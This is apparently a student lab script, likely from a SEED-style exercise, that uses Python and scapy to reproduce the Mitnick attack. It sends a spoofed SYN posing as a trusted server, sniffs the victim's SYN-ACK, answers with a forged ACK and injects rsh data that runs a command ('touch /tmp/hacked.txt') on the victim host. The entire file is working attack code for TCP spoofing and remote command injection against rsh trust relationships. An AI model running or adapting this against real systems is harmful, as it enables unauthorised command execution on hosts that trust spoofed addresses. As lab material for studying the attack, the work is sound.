#!/user/bin/python3
from scapy.all import *

x_ip = "192.168.12.5" #X-Terminal 
x_port = 514 #Port number used by X-Terminal

srv_ip = "192.168.12.6" #The trusted server 
srv_port = 1023 #Port number used by the trusted server 


def spoof_pkt(pkt):
	Seq=123456789 + 1
	old_ip=pkt[IP]
	old_tcp=pkt[TCP]

	tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4
	print ("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,
old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))


	#send spoofed ACK packet to the X-terminal when SYN ACK packet is detected
	if old_tcp.flags=="SA":
		print("sending spoofed ACK packet to the X-Terminal (Victim)")
		ip=IP(src=srv_ip,dst=x_ip)
		tcp=TCP(sport=srv_port, dport=x_port, flags="A", seq=Seq, ack=old_ip.seq + 1)
		pkt=ip/tcp
		send(pkt, verbose=0)

	# Once the ACK packet is sent, send the RSH data
		print("Sending Spoofed RSH Data Packet to the X-Terminal(victim)")
		data = '9090\x00seed\x00seed\x00touch /tmp/hacked.txt\x00'
		pkt = ip/tcp/data
		send(pkt,verbose=0)

#Sending spoofed SYN packet to the X-terminal
def spoofing_SYNPacket():
	print("Sending Spoofed SYN packet to X-terminal (victim)")
	ip = IP(src="192.168.12.6", dst="192.168.12.5") #src is trusted server and dst is victim
	tcp = TCP(sport=1023,dport=514,flags="S", seq=123456789)
	pkt = ip/tcp
	send(pkt,verbose=0)


def main():
	spoofing_SYNPacket()
	pkt=sniff(filter="tcp and src host 192.168.12.5", prn=spoof_pkt) 
if __name__ == "__main__":
	main()

